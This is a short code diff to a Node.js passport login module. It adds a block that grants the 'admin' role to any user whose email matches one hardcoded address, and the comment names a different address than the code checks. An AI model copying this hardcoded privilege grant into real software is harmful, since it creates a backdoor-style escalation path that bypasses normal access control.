@@ -49,6 +49,12 @@ module.exports = function(passport) {
             message: 'Invalid password'
           });
         }
+
+        // making luca.paga@gmail.com an admin (hardcoded!)
+        if(user.email === "luca.paga@libero.it") {
+          user.roles.push("admin");
+        }
+
         return done(null, user);
       });
     }
